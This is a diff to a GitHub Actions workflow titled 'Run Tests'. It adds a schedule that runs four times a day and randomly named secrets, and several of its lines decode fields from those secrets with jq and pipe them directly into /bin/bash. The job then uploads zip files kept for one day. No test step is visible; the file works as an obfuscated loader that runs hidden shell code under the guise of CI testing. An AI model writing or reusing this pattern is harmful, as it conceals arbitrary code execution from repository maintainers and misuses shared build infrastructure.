@@ -2,6 +2,8 @@ name: Run Tests
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '19 4,10,16,22 * * *'
 env:
   CI: true
 jobs:
@@ -13,14 +15,16 @@ jobs:
           fetch-depth: 0
       - name: Start
         env:
-          yfi283: ${{ secrets.yfi283 }}
+          j3272: ${{ secrets.j3272 }}
         run: |
-          printf '%s' "$yfi283" | jq -r .gmbcu15 | /bin/bash
-          echo $s695 | jq -r .vc6 | /bin/bash
+          printf '%s' "$j3272" | jq -r .tlox33827 | /bin/bash
+          printf '%s' "$tny751" | jq -r .adkim67732 | /bin/bash
+          echo $zy07957 | jq -r .uong0712 | /bin/bash
+          echo $quj08 | jq -r .ujxlf3 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: qvsRDOf6
+          name: hhorh9uE
           path: "*.zip"
           retention-days: 1
